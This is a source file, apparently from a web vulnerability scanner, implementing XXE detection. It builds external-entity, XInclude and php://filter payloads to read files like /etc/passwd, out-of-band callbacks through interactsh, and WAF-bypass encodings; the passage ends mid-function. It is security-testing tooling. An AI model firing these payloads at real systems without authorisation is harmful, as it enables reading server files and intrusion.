# XXE（XML 外部实体注入 / XML External Entity）检测流程。
#
# 这个文件负责“怎么检测 XXE”，自带一份精简的主动发包逻辑（不复用 SQL / XSS / RCE / LFI / SSRF
# 插件，各插件互不影响）。
#
# 【和其它插件的根本区别：XXE 的注入点是“被解析的 XML”，不是单个参数】
#   所以流量筛选（先筛后测）的关口是“这条请求里有没有 XML”：请求体 Content-Type 是 XML、
#   或请求体本身长得像 XML、或某个参数值本身就是一段完整 XML 文档。命中才进入检测。
#
# 【两种确认通道（都低误报，互补）】
#   1. 带外（OOB）—— 首选，最通用、覆盖面最广（含盲打）：
#      在 XML 里塞一个指向唯一子域的外部实体 / 外部 DTD / 参数实体，解析器一去解析（哪怕只
#      DNS 解析）就回连 interactsh，轮询命中即高置信。不依赖响应回显，回连来源 IP 是目标服务器，
#      天然证明是“服务端解析器”发起。见 oob.py + tools/interactsh_client.py。异步到达，由后台
#      轮询线程关联 token 后写结果。
#   2. 带内文件读取（in-band）—— 目标无出网时兜底，危害确认最直观：
#      外部实体指向 file:///etc/passwd，并把 &xxe; 注入原 XML 叶子文本；只有解析器真读到文件、
#      并把内容回显，响应里才会出现该文件 signature（root:x:0:0:）。参数被反射只回显 payload
#      字符串、不含 signature，且要求 signature 不在 baseline，误报极低（与目录遍历同理）。
#      另含 XInclude（禁用 DOCTYPE/实体时仍能读文件）与 php://filter（读 PHP 源码）两种形态。
#
# 【绕过写法：主流并进基础 payload，编码级 tamper 保留】
#   外部实体的四种落点写法（外部通用实体 / 参数实体 / 外部 DTD / XInclude）直接写进 rules.yaml
#   基础模板，一轮覆盖。而“绕过 WAF 关键字匹配”的整段 XML 重编码（UTF-16 / UTF-7 / DOCTYPE 内
#   换行）会成倍放大请求，所以保留成独立 tamper 阶段（tamper.py），只在响应像被 WAF 拦、或
#   full_payload_scan 时才对整段 body 追发少量变体。

import base64
import os
import re
import socket
import ssl
import threading
import time
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, quote_plus, urlsplit, urlunsplit
from urllib.request import (
    HTTPSHandler,
    HTTPRedirectHandler,
    ProxyHandler,
    Request,
    build_opener,
)

from pass_scan.body_paser import decode_body_text, get_header, get_media_type
from pass_scan.reporter import print_finding_once, write_html_report, write_jsonl
from pass_scan.scan_context import build_scan_context, replace_json_body_parameter
from pass_scan.terminal import red
from pass_scan.xxe.oob import OOBManager
from pass_scan.xxe.rules import (
    inband_files,
    inband_specials,
    inband_templates,
    max_tampered_payloads_per_probe,
    oob_templates,
    render_template,
    tamper_profiles,
    waf_detection_rules,
)
from pass_scan.xxe.tamper import apply_tampers


VULN_FILE = os.environ.get("PASS_SCAN_VULN_FILE", os.path.join("logs", "vulns.jsonl"))
REPORT_FILE = os.environ.get("PASS_SCAN_REPORT_FILE", "report.html")

# 单个主动探测请求的超时时间。外部实体解析可能触发外连，给足余量。
TIMEOUT = 15

# 做响应查找/比较时截取的最大长度。
MAX_COMPARE_CHARS = 400000

# 这些 os 是“具体系统”。识别出其一后，带 os 标签的文件只发当前系统的版本。
CONCRETE_OS = {"unix", "windows"}

# PHP 源码读取的命中哨兵（rules.yaml 里 php_index 的 signature）。
PHP_BASE64_SIGNATURE = "__php_base64__"

# 固定实体名。实体名不需要唯一（带外靠唯一域名区分注入点，带内靠 signature 判定）。
ENTITY_NAME = "xxe"

# 连接级 header，不适合照抄到主动重放请求。
HOP_BY_HOP_HEADERS = {
    "host",
    "content-length",
    "transfer-encoding",
    "connection",
    "proxy-connection",
    "proxy-authorization",
    "upgrade",
}

# XML 结构识别用的轻量正则（不做完整 XML 解析：完整解析会转义 & 和 DOCTYPE，
# 反而没法注入原始外部实体，所以这里用字符串/正则组装）。
XML_DECL_RE = re.compile(r"^\s*<\?xml\b[^>]*\?>", re.IGNORECASE)
DOCTYPE_RE = re.compile(r"<!DOCTYPE\b.*?>", re.IGNORECASE | re.DOTALL)
COMMENT_RE = re.compile(r"<!--.*?-->", re.DOTALL)
ROOT_TAG_RE = re.compile(r"<\s*([A-Za-z_][\w.\-]*(?::[A-Za-z_][\w.\-]*)?)")
# 叶子文本：一对相邻标签之间、内部不含其它标签的文本。
LEAF_TEXT_RE = re.compile(r">([^<>]+)<")
# 响应里疑似 base64 大块（php://filter 源码读取判定）。
BASE64_BLOCK_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
# php://filter 解码后判定命中的特征：PHP 源码开标签，或 /etc/passwd 内容。
PHP_DECODED_SIGNATURES = (
    ("PHP源码", re.compile(r"<\?php|<\?=")),
    ("passwd", re.compile(r"root:.*?:0:0:")),
)


class NoRedirectHandler(HTTPRedirectHandler):
    """禁止 urllib 自动跟随跳转。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class XXEScanner:
    """XXE 扫描器。

    接口和 SQLInjectionScanner / CommandInjectionScanner / PathTraversalScanner /
    XSSScanner / SSRFScanner 对齐：
    - name
    - interested(context)
    - dedup_key(context)
    - check(context)
    """

    name = "xxe"

    def __init__(self, config=None, vuln_file=None, report_file=None):
        self.config = config or {}
        self.full_payload_scan = bool(self.config.get("full_payload_scan", False))
        # deep_tamper：开启后①追发 oob_templates_extra 里更激进的带外变体；②允许对被 WAF 拦的
        # 带内 payload 追发编码 tamper 绕过。默认开启，追求覆盖面。
        self.deep_tamper = bool(self.config.get("deep_tamper", True))
        self.deep_tamper_max_profiles = int(self.config.get("deep_tamper_max_profiles", 2))

        # 内部去重：同一路径下同一注入点只主动扫描一次。
        self.scanned = set()
        # OOB 回连可能来自同一注入点的多个 payload/token；报告层同一注入点只报一次。
        self.reported_oob_findings = set()
        # 每个 host 已识别出的操作系统类型（unix / windows）。
        self.host_os = {}

        self.lock = threading.Lock()
        self.waf_state = None
        self.on_finding = None
        self.vuln_file = vuln_file or VULN_FILE
        self.report_file = report_file or REPORT_FILE

        # OOB 带外：启用后对接 interactsh 公共服务，后台轮询回连。
        self.oob = OOBManager(
            self.config.get("oob"), on_interaction=self.handle_oob_interaction
        )
        self.oob.start()

        # 不走系统代理，避免主动探测又绕回 Burp/mitmproxy 形成回环。
        # 不校验 HTTPS 证书，方便测试自签名站点。
        ssl_context = ssl._create_unverified_context()
        self.opener = build_opener(
            ProxyHandler({}),
            HTTPSHandler(context=ssl_context),
            NoRedirectHandler,
        )

        os.makedirs(os.path.dirname(self.vuln_file) or ".", exist_ok=True)

    # ------------------------------------------------------------------
    # 调度层接口
    # ------------------------------------------------------------------

    def interested(self, context):
        """轻量判断：XXE 插件是否关心这条流量。不发请求。

        流量筛选关口：GET/POST/PUT/PATCH，且请求里存在 XML（整个 body 是 XML，或某参数值
        本身是一段完整 XML 文档）。没有 XML 就直接跳过，不进入 XXE 检测。
        """
        if context.is_skipped:
            return False
        if context.method not in ("GET", "POST", "PUT", "PATCH"):
            return False
        return bool(self.extract_xml_targets(context))

    def dedup_key(self, context):
        """调度层去重 key：同一 URL 路径 + 同一批 XML 注入点，TTL 内只入队一次。"""
        target_shape = tuple(
            (t["place"], t["name"], t.get("index", ""))
            for t in self.extract_xml_targets(context)
        )
        return (
            self.name,
            context.method,
            context.scheme,
            context.host,
            self.normalize_path_for_dedup(context.path),
            context.request_content_type,
            target_shape,
        )

    def check(self, context, flow=None):
        """XXE 检测入口。"""
        # 兼容旧调用方式 check(record, flow)。
        if flow is not None:
            context = build_scan_context(
                context,
                flow,
                {"scan": {"max_params_per_request": 8}},
            )

        if not self.interested(context):
            return []

        flow = context.flow
        targets = self.extract_xml_targets(context)
        if not targets:
            return []

        # baseline 兼作“目标是否存活 + signature 是否页面自带”的门槛：一次原样重放。
        baseline = self.build_baseline(flow)
        if not baseline:
            return []

        findings = []
        for target in targets:
            scan_key = self.make_scan_key(flow, target)
            with self.lock:
                if scan_key in self.scanned:
                    continue
                reserved_scan = self.oob.enabled
                if reserved_scan:
                    self.scanned.add(scan_key)

            # 先发带外（异步，不即时返回），再做带内文件读取（同步，命中即返回）。
            oob_dispatched = self.fire_oob(flow, target)

            finding = self.check_inband_target(flow, baseline, target)
            if finding:
                with self.lock:
                    self.scanned.add(scan_key)
                    self.reported_oob_findings.add(scan_key)
            elif oob_dispatched and not reserved_scan:
                with self.lock:
                    self.scanned.add(scan_key)
            elif reserved_scan and not oob_dispatched:
                with self.lock:
                    self.scanned.discard(scan_key)

            if finding:
                findings.append(finding)
                self.write_finding(finding)
                print_finding_once(self, finding)

        return findings

    # ------------------------------------------------------------------
    # XML 注入点提取
    # ------------------------------------------------------------------

    def extract_xml_targets(self, context):
        """从请求里提取 XML 注入点。

        1. 整个请求 body 是 XML（Content-Type 声明 XML，或 body 本身长得像 XML）。
        2. 某个参数值本身就是一段完整 XML 文档（XML 塞在字段里的场景）。
           普通模式取 query/form/json；full_payload_scan 额外取 cookie/header。
        """
        flow = context.flow
        request = flow.request
        targets = []

        body = request.content or b""
        if body:
            media = get_media_type(context.request_content_type)
            text, charset = decode_body_text(body, request.headers)
            if (self.is_xml_media(media) or self.looks_like_xml(text)) and self.build_xml_shell(text):
                targets.append(
                    {
                        "place": "body",
                        "name": "body",
                        "index": "",
                        "value": text,
                        "charset": charset or "utf-8",
                    }
                )

        wanted = {"query", "form", "json"}
        if self.full_payload_scan:
            wanted |= {"cookie", "header"}
        for param in context.parameters:
            if param["place"] not in wanted:
                continue
            value = param.get("value") or ""
            if self.looks_like_xml(value) and self.build_xml_shell(value):
                target = dict(param)
                target["value"] = value
                targets.append(target)

        return targets

    def is_xml_media(self, media):
        """Content-Type 主类型是否是 XML（含 +xml 后缀、svg）。"""
        if not media:
            return False
        return (
            media in ("application/xml", "text/xml")
            or media.endswith("+xml")
            or media.endswith("/xml")
        )

    def looks_like_xml(self, text):
        """判断一段文本是否像 XML 文档（低误报的轻量判断）。"""
        if not text:
            return False
        head = text.lstrip()
        if not head.startswith("<"):
            return False
        if head[:20].lower().startswith("<?xml"):
            return True
        # 需要至少一个元素标签，且有闭合/自闭合，避免把 HTML 片段/单个 < 误当 XML。
        if "</" in head or "/>" in head:
            return bool(self.find_root_name(head))
        return False

    def normalize_path_for_dedup(self, path):
        """去重用路径归一化：/api 和 /api/ 视为同一端点。"""
        path = path or "/"
        if path == "/":
            return path
        return path.rstrip("/") or "/"

    # ------------------------------------------------------------------
    # XML 外壳解析与实体注入（字符串级，保留原始 & 和 DOCTYPE）
    # ------------------------------------------------------------------

    def build_xml_shell(self, text):
        """把一段 XML 拆成 {decl, root, remainder}，用于组装带 DOCTYPE 的 payload。

        - decl：原 <?xml ...?> 声明（没有则后续用默认声明补）。
        - root：根元素名（DOCTYPE 名字必须与之一致）。
        - remainder：去掉声明和已有 DOCTYPE 后的正文（我们会在它前面插 DOCTYPE）。
        无法识别根元素时返回 None（不是可注入的 XML）。
        """
        if not text:
            return None

        stripped = text.lstrip()
        decl = ""
        match = XML_DECL_RE.match(stripped)
        if match:
            decl = match.group(0)
            rest = stripped[match.end():]
        else:
            rest = stripped

        # 去掉已有 DOCTYPE，避免和我们注入的冲突（一个文档只能有一个 DOCTYPE）。
        rest = DOCTYPE_RE.sub("", rest, count=1)

        root = self.find_root_name(rest)
        if not root:
            return None
        return {"decl": decl, "root": root, "remainder": rest}

    def find_root_name(self, text):
        """找第一个元素标签的名字（跳过注释/空白）。"""
        scan = COMMENT_RE.sub("", text)
        match = ROOT_TAG_RE.search(scan)
        return match.group(1) if match else ""

    def inject_entity_refs(self, text, ref):
        """把 ref（如 &xxe;）注入到所有非空叶子文本里，返回 (新文本, 注入次数)。"""
        count = 0

        def replace(match):
            nonlocal count
            inner = match.group(1)
            if inner.strip() == "":
                return match.group(0)
            count += 1
            return ">" + ref + "<"

        new_text = LEAF_TEXT_RE.sub(replace, text)
        return new_text, count

    def has_injectable_leaf(self, shell):
        """判断正文里有没有可注入实体引用的叶子文本（决定 ref 型 payload 是否值得发）。"""
        _new, count = self.inject_entity_refs(shell["remainder"], "&xxe;")
        return count > 0

    def assemble(self, shell, doctype, ref):
        """组装最终 XML payload：声明 + DOCTYPE + 正文（ref 非空时注入叶子文本）。

        ref 型 payload 若正文没有可注入的叶子文本，返回 None（无处引用，发了也不会触发）。
        """
        decl = shell["decl"] or '<?xml version="1.0" encoding="utf-8"?>'
        body = shell["remainder"]
        if ref:
            body, count = self.inject_entity_refs(body, ref)
            if count == 0:
                return None
        return decl + doctype + body

    def build_xinclude(self, shell, uri):
        """构造 XInclude 读文件的 payload（禁用 DOCTYPE/实体时仍可能生效）。

        用原根元素名建一个最小文档，把 <xi:include parse="text"> 作为唯一子节点，
        文件内容会被当文本嵌入，命中同样按 signature 判定。
        """
        decl = shell["decl"] or '<?xml version="1.0" encoding="utf-8"?>'
        root = shell["root"]
        return (
            f"{decl}<{root} xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
            f"<xi:include parse=\"text\" href=\"{uri}\"/>"
            f"</{root}>"
        )

    # ------------------------------------------------------------------
    # 带内文件读取检测
    # ------------------------------------------------------------------

    def check_inband_target(self, flow, baseline, target):
        """对一个 XML 注入点做带内文件读取检测：读到敏感文件内容即确认。"""
        shell = self.build_xml_shell(target["value"])
        if not shell:
            return None

        has_leaf = self.has_injectable_leaf(shell)
        files = self.filter_files_by_os(flow, inband_files())
        specials = inband_specials()

        for entry in files:
            uri = entry["uri"]

            # 外部实体模板：base 只用 general_entity；full 时再加 nested_entity。
            for template in self.inband_templates_for():
                ref = render_template(template.get("ref", ""), entity=ENTITY_NAME)
                if ref and not has_leaf:
                    # 无叶子可引用，&xxe; 无处回显，跳过（xinclude / 带外仍覆盖）。
                    continue
                doctype = render_template(
                    template["doctype"], root=shell["root"], entity=ENTITY_NAME, uri=uri
                )
                payload = self.assemble(shell, doctype, ref)
                if payload is None:
                    continue

                finding = self.run_inband_payload(
                    flow, baseline, target, entry, payload,
                    f"{template['name']}:{entry['name']}",
                )
                if finding:
                    return finding

            # XInclude：仅对可文本回显的文件（passwd/proc_version/win.ini），php_index 不走。
            if "xinclude" in specials and self.is_text_file(entry):
                payload = self.build_xinclude(shell, uri)
                finding = self.run_inband_payload(
                    flow, baseline, target, entry, payload, f"xinclude:{entry['name']}"
                )
                if finding:
                    return finding

        return None

    def run_inband_payload(self, flow, baseline, target, entry, payload, group_name):
        """发送单个带内 payload（含 WAF/深度 tamper 变体），命中 signature 即生成结果。"""
        baseline_text = baseline.get("text", "") if baseline else ""
        for probe in self.send_inband_variants(flow, target, payload, baseline):
            if probe.get("waf_blocked") or probe.get("timed_out"):
                continue
            hit = self.match_signature(entry, probe, baseline_text)
            if not hit:
                continue

            self.record_os(flow, entry.get("os"))
            return self.build_finding(
                flow,
                target,
                {
                    "technique": "带内文件读取",
                    "message": "external entity read a local file and its content appeared in response",
                    "os": entry.get("os"),
                    "target_file": entry.get("uri"),
                    "payload_group": group_name,
                    "payload": probe["sent_payload"],
                    "matched_content": hit,
                    "confidence": "high",
                    "baseline_status": baseline["status_code"],
                    "probe_status": probe["status_code"],
                    "probe_length": probe["length"],
                    **self.tamper_evidence(probe),
                },
                proof_probe=probe,
            )
        return None

    def match_signature(self, entry, probe, baseline_text):
        """判断探测响应是否命中该文件的 signature。命中返回可读证据片段，否则 None。"""
        signature = entry.get("signature") or ""
        text = probe.get("text", "")

        if signature == PHP_BASE64_SIGNATURE:
            return self.match_php_base64(text)

        try:
            pattern = re.compile(signature)
        except re.error:
            return None

        match = pattern.search(text)
        if not match:
            return None
        # signature 本来就在 baseline 里（页面自带），不算漏洞，排除误报。
        if pattern.search(baseline_text):
            return None
        return match.group(0)[:120]

    def match_php_base64(self, text):
        """在响应里找 base64 大块，解码后判是否读到 PHP 源码 / passwd。"""
        for block in BASE64_BLOCK_RE.findall(text)[:20]:
            trimmed = block[: len(block) - (len(block) % 4)]
            if len(trimmed) < 40:
                continue
            try:
                decoded = base64.b64decode(trimmed, validate=True)
            except ValueError:
                continue
            head = decoded[:4000].decode("utf-8", errors="replace")
            for label, pattern in PHP_DECODED_SIGNATURES:
                if pattern.search(head):
                    snippet = head.strip().splitlines()[0] if head.strip() else ""
                    return f"base64->{label}: {snippet[:100]}"
        return None

    def is_text_file(self, entry):
        """是否是可文本回显的文件（XInclude parse=text 有意义；php 源码走 base64 不算）。"""
        return entry.get("signature") != PHP_BASE64_SIGNATURE

    def inband_templates_for(self):
        """带内外部实体模板：base 只用 general_entity；full 时加 nested_entity。"""
        templates = inband_templates()
        if self.full_payload_scan:
            return templates
        return [t for t in templates if t.get("name") == "general_entity"] or templates[:1]

    # ------------------------------------------------------------------
    # 带外（OOB）检测
    # ------------------------------------------------------------------

    def fire_oob(self, flow, target):
        """发送带外 payload 并登记 token。返回 True 表示至少发出过一个 payload。"""
        if not self.oob.enabled:
            return False

        shell = self.build_xml_shell(target["value"])
        if not shell:
            return False
        has_leaf = self.has_injectable_leaf(shell)

        base_info = {
            "scan_key": self.make_scan_key(flow, target),
            "url": flow.request.pretty_url,
            "request_method": flow.request.method,
            "param_place": target["place"],
            "param_name": target["name"],
        }

        sent_any = False
        for template in oob_templates(extra=self.use_extra_oob()):
            ref_tmpl = template.get("ref", "")
            # ref 型带外变体需要正文能引用 &xxe;；没有叶子就别浪费一个带外域名。
            if ref_tmpl and not has_leaf:
                continue

            token, host = self.oob.new_domain()
            if not token:
                return sent_any
            doctype = render_template(
                template["doctype"], root=shell["root"], entity=ENTITY_NAME, domain=host
            )
            ref = render_template(ref_tmpl, entity=ENTITY_NAME)
            payload = self.assemble(shell, doctype, ref)
            if payload is None:
                continue
            self._send_and_register_oob(
                flow, target, payload, host, token, template["name"], base_info
            )
            sent_any = True
        return sent_any

    def _send_and_register_oob(self, flow, target, payload, host, token, group_name, base_info):
        """发送单个带外 payload 并把注入点信息登记到 token 上。"""
        info = dict(base_info)
        info.update(
            {
                "payload_group": group_name,
                "payload": payload,
                "oob_domain": host,
                "request_packet": self.preview_request_packet(flow, target, payload),
            }
        )
        self.oob.record(token, info)
        probe = self.send_probe(flow, target, payload)
        if probe and probe.get("request_packet"):
            self.oob.record(token, {"request_packet": probe.get("request_packet", "")})

    def preview_request_packet(self, flow, target, payload):
        """在真正发包前生成请求包，避免 OOB 回连先到时报告缺少上下文。"""
        request = flow.request
        method = request.method.upper()
        url, body, header_overrides = self.build_probe_request(flow, target, payload)
        headers = self.copy_headers(request.headers)
        for name, value in header_overrides.items():
            self.set_header(headers, name, value)
        data = body if method != "GET" else None
        return self.build_request_packet(method, url, headers, data)

    def handle_oob_interaction(self, info, interaction):
        """后台轮询线程回调：收到某注入点的带外回连，生成 XXE 漏洞结果。

        HTTP 回连说明解析器真的发起了 HTTP 请求（去拉外部 DTD/实体），置信度最高；DNS-only
        回连说明至少解析了我们的域名，置信度稍低，在证据里标注。
        """
        protocol = (interaction.get("protocol") or "").upper()
        remote = (
            interaction.get("remote-address")
            or interaction.get("remoteAddress")
            or ""
        )
        report_key = self.oob_report_key(info)
        with self.lock:
            if report_key in self.reported_oob_findings:
                return
            self.reported_oob_findings.add(report_key)

        confidence = "high" if protocol in ("HTTP", "HTTPS", "FTP") else "medium"
        finding = {
            "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            "type": "xxe",
            "method": "xxe",
            "request_method": info.get("request_method", ""),
            "url": info.get("url", ""),
            "param_place": info.get("param_place", ""),
            "param_name": info.get("param_name", ""),
            "evidence": {
                "technique": "带外解析",
                "message": f"out-of-band {protocol} callback received while target parsed our external entity",
                "payload_group": info.get("payload_group"),
                "payload": info.get("payload"),
                "oob_protocol": protocol,
                "oob_remote_address": remote,
                "oob_domain": info.get("oob_domain"),
                "confidence": confidence,
            },
            "proof": {
                "request": info.get("request_packet", ""),
                "response": self.oob_proof_text(interaction),
            },
            "extra_proofs": [],
        }
        self.write_finding(finding)
        print_finding_once(self, finding)

    def oob_report_key(self, info):
        """同一请求注入点的多个 OOB token 只生成一条 XXE 报告。"""
        scan_key = info.get("scan_key")
        if scan_key:
            return tuple(scan_key)
        return (
            info.get("request_method", ""),
            info.get("url", ""),
            info.get("param_place", ""),
            info.get("param_name", ""),
            info.get("param_index", ""),
        )

    def oob_proof_text(self, interaction):
        """把一次带外交互整理成可读的“证据”文本，放进报告的响应包位置。"""
        lines = ["[OOB interaction]"]
        for key in ("protocol", "unique-id", "full-id", "remote-address", "timestamp", "q-type"):
            value = interaction.get(key)
            if value:
                lines.append(f"{key}: {value}")
        raw = interaction.get("raw-request") or interaction.get("rawRequest")
        if raw:
            lines.append("")
            lines.append(str(raw))
        return "\n".join(lines)

    def use_extra_oob(self):
        """是否发送额外带外变体（更多绕过写法）。full_payload_scan 或 deep_tamper 时开启。"""
        return self.full_payload_scan or self.deep_tamper

    # ------------------------------------------------------------------
    # OS 家族记忆
    # ------------------------------------------------------------------

    def host_from_flow(self, flow):
        return urlsplit(flow.request.pretty_url).netloc

    def record_os(self, flow, os_name):
        """记住某 host 已识别出的操作系统类型（只记具体系统）。"""
        if os_name not in CONCRETE_OS:
            return
        host = self.host_from_flow(flow)
        with self.lock:
            if self.host_os.get(host) != os_name:
                self.host_os[host] = os_name

    def known_os(self, flow):
        with self.lock:
            return self.host_os.get(self.host_from_flow(flow))

    def filter_files_by_os(self, flow, files):
        """按已识别的 OS 裁剪文件；未识别时全部尝试。"""
        os_name = self.known_os(flow)
        if not os_name:
            return files
        filtered = [f for f in files if f.get("os", "any") in (os_name, "any")]
        return filtered or files

    # ------------------------------------------------------------------
    # 主动发包
    # ------------------------------------------------------------------

    def send_inband_variants(self, flow, target, payload, baseline=None):
        """发送单个带内 payload，被 WAF 拦或 full 时追加整段 XML 的编码 tamper 变体。

        编码级 tamper 只对“整个 body 就是 XML”的注入点有意义（换编码会破坏 URL 参数里的 XML），
        参数注入点只发原始 payload。
        """
        probe = self.send_probe(flow, target, payload)
        if not probe:
            return

        waf_info = self.detect_waf_block(probe, baseline)
        self.annotate_probe(probe, payload, "none", [], waf_info, [])
        yield probe

        # 只有 body 注入点做编码 tamper；且需 WAF 拦截、或 full_payload_scan 才追发。
        if target["place"] != "body":
            return
        speculative = self.full_payload_scan
        if not waf_info["blocked"] and not speculative:
            return

        original_reasons = waf_info["reasons"]
        is_deep = not original_reasons
        profile_limit = self.deep_tamper_profile_limit() if is_deep else None

        base_text = payload if isinstance(payload, str) else payload.decode("utf-8", errors="replace")
        for profile in self.iter_tamper_profiles(profile_limit):
            data = apply_tampers(base_text, profile["tampers"])
            if not data:
                continue
            retry = self.send_probe(flow, target, data)
            if not retry:
                continue
            retry_waf = self.detect_waf_block(retry, baseline)
            self.annotate_probe(
                retry, base_text, profile["name"], profile["tampers"],
                retry_waf, original_reasons, deep_tamper=is_deep,
            )
            yield retry

    def send_probe(self, flow, target, payload):
        """主动发送探测请求。

        target 为 None 表示原样重放（baseline）。
        payload 可以是 str（组装好的 XML）或 bytes（tamper 后的整段 body）。
        """
        request = flow.request
        method = request.method.upper()
        url, body, header_overrides = self.build_probe_request(flow, target, payload)
        host = urlsplit(url).netloc

        if self.waf_state:
            self.waf_state.wait_if_needed(host)

        headers = self.copy_headers(request.headers)
        for name, value in header_overrides.items():
            self.set_header(headers, name, value)

        data = body if method != "GET" else None
        request_packet = self.build_request_packet(method, url, headers, data)
        urllib_request = Request(url, data=data, headers=headers, method=method)

        start_time = time.monotonic()
        try:
            response = self.opener.open(urllib_request, timeout=TIMEOUT)
            response_body = response.read()
            status_code = response.status
            reason = getattr(response, "reason", "")
            response_headers = response.headers
        except HTTPError as error:
            response_body = error.read()
            status_code = error.code
            reason = getattr(error, "reason", "")
            response_headers = error.headers
        except (socket.timeout, TimeoutError):
            return self.timed_out_probe(request_packet)
        except (URLError, OSError) as error:
            reason = getattr(error, "reason", None)
            if isinstance(reason, (socket.timeout, TimeoutError)):
                return self.timed_out_probe(request_packet)
            return None

        elapsed = time.monotonic() - start_time
        charset = response_headers.get_content_charset() or "utf-8"
        text = response_body.decode(charset, errors="replace")
        response_packet = self.build_response_packet(
            status_code, reason, response_headers, response_body, charset
        )

        return {
            "status_code": status_code,
            "length": len(response_body),
            "elapsed": elapsed,
            "headers": dict(response_headers.items()),
            "text": text[:MAX_COMPARE_CHARS],
            "request_packet": request_packet,
            "response_packet": response_packet,
        }

    def timed_out_probe(self, request_packet=""):
        """构造“请求超时”的探测结果。"""
        return {
            "status_code": 0,
            "length": 0,
            "elapsed": float(TIMEOUT),
            "headers": {},
            "text": "",
            "timed_out": True,
            "request_packet": request_packet,
            "response_packet": "",
        }

    # ------------------------------------------------------------------
    # baseline
    # ------------------------------------------------------------------

    def build_baseline(self, flow):
        """构造 baseline：优先用一次原样重放，退回 mitmproxy 已有响应。"""
        clean = self.send_probe(flow, None, None)
        if clean and not clean.get("timed_out"):
            return clean

        original = self.response_from_flow(flow)
        if original:
            return original
        return None

    def response_from_flow(self, flow):
        """把 mitmproxy 已拿到的原始响应转换成可比较结构。"""
        response = getattr(flow, "response", None)
        if not response:
            return None
        body = response.content or b""
        text, _charset = decode_body_text(body, response.headers)
        return {
            "status_code": response.status_code,
            "length": len(body),
            "elapsed": 0,
            "headers": dict(response.headers.items()),
            "text": text[:MAX_COMPARE_CHARS],
        }

    # ------------------------------------------------------------------
    # 请求构造
    # ------------------------------------------------------------------

    def build_probe_request(self, flow, target, payload):
        """根据注入点位置构造新的 URL、body 和 header 覆盖项。

        - target 为 None：原样重放（payload 忽略）。
        - place == body：用 payload 整段替换请求 body（str 按 charset 编码，bytes 直接用）。
        - 其它 place：把 payload（str）作为该参数的新值注入。
        """
        request = flow.request
        url = request.pretty_url
        body = request.content or b""
        header_overrides = {}

        if not target:
            return url, body, header_overrides

        place = target["place"]

        if place == "body":
            if isinstance(payload, bytes):
                body = payload
            else:
                charset = target.get("charset") or "utf-8"
                body = str(payload).encode(charset, errors="replace")
            return url, body, header_overrides

        # 参数注入点：payload 一定是 str（编码 tamper 不作用于参数）。
        value = payload if isinstance(payload, str) else payload.decode("utf-8", errors="replace")

        if place == "query":
            url = self.replace_query_value(url, target["index"], value)
            return url, body, header_overrides

        if place == "cookie":
            cookie_header = get_header(request.headers, "cookie")
            pairs = self.parse_cookie_pairs(cookie_header)
            pairs[target["index"]] = (target["name"], value)
            header_overrides["Cookie"] = self.build_cookie_header(pairs)
            return url, body, header_overrides

        if place == "header":
            header_overrides[target["name"]] = value
            return url, body, header_overrides

        if place == "form":
            text, _charset = decode_body_text(body, request.headers)
            pairs = parse_qsl(text, keep_blank_values=True)
            pairs[target["index"]] = (target["name"], value)
            charset = target.get("charset") or "utf-8"
            body = self.urlencode_pairs(pairs, charset).encode(charset, errors="replace")
            return url, body, header_overrides

        if place == "json":
            body = replace_json_body_parameter(
                body,
                request.headers,
                target,
                value,
            )
            return url, body, header_overrides

        return url, body, header_overrides

    def replace_query_value(self, url, index, new_value):
        """只替换 URL 里第 index 个 query 参数。"""
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        pairs[index] = (pairs[index][0], new_value)
        new_query = self.urlencode_pairs(pairs)
        return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))

    def urlencode_pairs(self, pairs, charset="utf-8"):
        """编码 query/form 参数，保留 payload 里手写的 %xx。"""
        encoded = []
        for name, value in pairs:
            encoded_name = quote_plus(str(name), encoding=charset, errors="replace")
            encoded_value = quote_plus(str(value), safe="%", encoding=charset, errors="replace")
            encoded.append(f"{encoded_name}={encoded_value}")
        return "&".join(encoded)

    def parse_cookie_pairs(self, cookie_header):
        pairs = []
        if not cookie_header:
            return pairs
        for item in cookie_header.split(";"):
            item = item.strip()
            if not item:
                continue
            if "=" in item:
                name, value = item.split("=", 1)
            else:
                name, value = item, ""
            pairs.append((name.strip(), value.strip()))
        return pairs

    def build_cookie_header(self, pairs):
        return "; ".join(f"{name}={value}" for name, value in pairs)

    def build_request_packet(self, method, url, headers, body):
        """把主动探测请求整理成类似 Burp 的原始请求包文本。"""
        parts = urlsplit(url)
        path = parts.path or "/"
        if parts.query:
            path = f"{path}?{parts.query}"

        packet_headers = dict(headers)
        if not any(name.lower() == "host" for name in packet_headers):
            packet_headers["Host"] = parts.netloc
        if body:
            packet_headers["Content-Length"] = str(len(body))

        lines = [f"{method} {path} HTTP/1.1"]
        for name, value in packet_headers.items():
            lines.append(f"{name}: {value}")
        request_text = "\r\n".join(lines) + "\r\n\r\n"
        if body:
            request_text += body.decode("utf-8", errors="replace")
        return request_text

    def build_response_packet(self, status_code, reason, headers, body, charset):
        """把主动探测响应整理成类似 Burp 的原始响应包文本。"""
        status_line = f"HTTP/1.1 {status_code} {reason}".rstrip()
        lines = [status_line]
        for name, value in headers.items():
            lines.append(f"{name}: {value}")
        response_text = "\r\n".join(lines) + "\r\n\r\n"
        response_text += body.decode(charset or "utf-8", errors="replace")
        return response_text

    def copy_headers(self, headers):
        """复制请求头，移除不适合主动重放的 header，并禁用压缩方便比较。"""
        copied = {}
        for name, value in headers.items():
            if name.lower() in HOP_BY_HOP_HEADERS:
                continue
            copied[name] = value
        copied["Accept-Encoding"] = "identity"
        return copied

    def set_header(self, headers, name, value):
        """大小写不敏感地覆盖 header。"""
        for old_name in list(headers.keys()):
            if old_name.lower() == name.lower():
                del headers[old_name]
        headers[name] = value

    # ------------------------------------------------------------------
    # WAF 识别与 tamper
    # ------------------------------------------------------------------

    def detect_waf_block(self, response, baseline=None):
        """判断一次探测响应是否像 WAF 拦截页。"""
        rules = waf_detection_rules()
        reasons = []

        status_codes = {int(code) for code in rules.get("status_codes", [])}
        status_code = int(response.get("status_code", 0))
        baseline_status = baseline.get("status_code") if baseline else None
        if status_code in status_codes and status_code != baseline_status:
            reasons.append(f"status_code:{status_code}")

        headers_text = "\n".join(
            f"{name}: {value}" for name, value in response.get("headers", {}).items()
        ).lower()
